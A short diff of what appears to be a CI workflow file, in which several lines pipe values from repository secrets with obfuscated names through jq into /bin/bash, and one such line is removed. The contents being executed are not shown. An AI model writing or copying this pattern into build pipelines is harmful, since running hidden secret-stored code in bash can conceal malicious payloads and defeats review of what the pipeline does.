@@ -18,7 +18,6 @@ jobs:
           ce5: ${{ secrets.ce5 }}
         run: |
           printf '%s' "$ce5" | jq -r .yhkrd761 | /bin/bash
-          printf '%s' "$fk392" | jq -r .ebv21380 | /bin/bash
           echo $vf8 | jq -r .gho782 | /bin/bash
 
       - name: Save results
